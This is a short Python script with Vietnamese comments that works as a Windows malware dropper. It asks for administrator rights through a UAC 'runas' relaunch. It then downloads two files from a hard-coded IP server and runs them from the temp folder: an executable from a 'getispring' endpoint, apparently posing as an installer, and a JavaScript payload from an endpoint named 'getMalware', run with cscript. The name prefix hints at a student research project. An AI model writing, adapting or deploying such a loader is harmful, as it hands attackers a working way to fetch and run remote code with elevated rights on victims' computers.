import urllib.request
import os
import subprocess
import tempfile
import uuid
import threading
import ctypes
import sys

# Gọi hàm API IsUserAnAdmin() để kiểm tra quyền quản trị
is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

# Nếu không có quyền quản trị, chạy lại chương trình với quyền quản trị
if not is_admin:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit(1)

def download_and_run(exe_url,type="exe"):
    filename="NCKH"+str(uuid.uuid4())+"."+type
    # Lấy đường dẫn thư mục tạm thời
    temp_dir = tempfile.gettempdir()

    # Tạo đường dẫn đến file trong thư mục tạm thời
    file_path = os.path.join(temp_dir, filename)
    print("File path: " + file_path)
    # Tải xuống file từ URL và lưu vào thư mục tạm thời
    urllib.request.urlretrieve(exe_url, file_path)
    # Chạy file .exe đã được tải xuống
    if type=="exe":
        subprocess.call(file_path)
    elif type=="js":
        subprocess.call(["cscript ",file_path])



print("Start")
run_thread1 = threading.Thread(target=download_and_run, args=("http://42.96.42.99:8082/getispring","exe"))
run_thread2 = threading.Thread(target=download_and_run, args=("http://42.96.42.99:8082/getMalware","js"))
run_thread2.start()

run_thread1.start()


